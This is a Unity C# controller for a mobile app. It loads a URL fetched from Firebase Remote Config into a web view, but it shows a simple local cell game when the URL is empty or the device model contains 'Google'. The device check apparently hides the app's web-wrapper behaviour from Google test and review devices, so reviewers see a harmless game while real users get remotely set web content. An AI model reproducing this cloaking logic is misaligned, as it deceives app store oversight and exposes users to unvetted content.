using Sirenix.OdinInspector;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using UnityEngine;

public class ApplicationController : MonoBehaviour
{
    [SerializeField]
    private MyFireBaseRemoteConfig remoteConfig;

    [SerializeField]
    private UniWebView webView;

    [SerializeField]
    private CellsCreator cellsCreator;

    private string savedUrl;

    // Start is called before the first frame update
    async void Start()
    {
        savedUrl = PlayerPrefs.GetString("URL");

        if (string.IsNullOrEmpty(savedUrl))
            await LoadUrl();

        else
            webView.Load(savedUrl);
        
    }

    [Button]
    public void ClearPrefs()
    {
        PlayerPrefs.DeleteAll();
    }

    private bool CheckModel()
    {
        if (SystemInfo.deviceModel.Contains("Google") || SystemInfo.deviceModel.Contains("google"))
            return false;
        else
            return true;
    }

    private async Task LoadUrl()
    {
        var url = await GetUrl();

        if (string.IsNullOrEmpty(url) || !CheckModel())
            cellsCreator.SetCells();

        else
        {
            PlayerPrefs.SetString("URL", url);
            webView.Load(url);
        }
            
    }

    private async Task<string> GetUrl()
    {
        await remoteConfig.FetchDataAsync();

        return Firebase.RemoteConfig.FirebaseRemoteConfig.DefaultInstance.GetValue("url_string").StringValue;
    }
}
